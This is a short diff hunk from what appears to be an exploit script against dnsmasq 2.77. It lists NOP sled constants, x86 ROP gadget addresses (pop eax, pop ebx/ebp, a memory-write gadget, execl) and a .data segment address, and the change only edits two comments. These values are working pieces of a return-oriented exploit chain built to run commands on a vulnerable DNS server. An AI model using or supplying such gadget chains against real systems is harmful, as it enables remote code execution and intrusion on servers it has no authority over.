@@ -10,14 +10,14 @@ NOPx86 = 0x90909090
 NOPx64 = 0x9090909090909090
 
 # ROP gadgets
-# dnsmasq/2.77
+# dnsmasq/2.77 x86
 POP_EAX_277x86 = 0x08081617        # pop eax; ret
 POP_EBX_EBP_277x86 = 0x0804a392    # pop ebx; pop ebp; ret
 MOV_EAX_EBX_277x86 = 0x080672c3    # mov [eax+0x1],ebx; add cl,cl; ret
 EXECL_277x86 = 0x08070758          # execl
 
 # Segment .data
-# dnsmasq/2.77
+# dnsmasq/2.77 x86
 DATA_277x86 = 0x0808c054
 
 Base = Base()
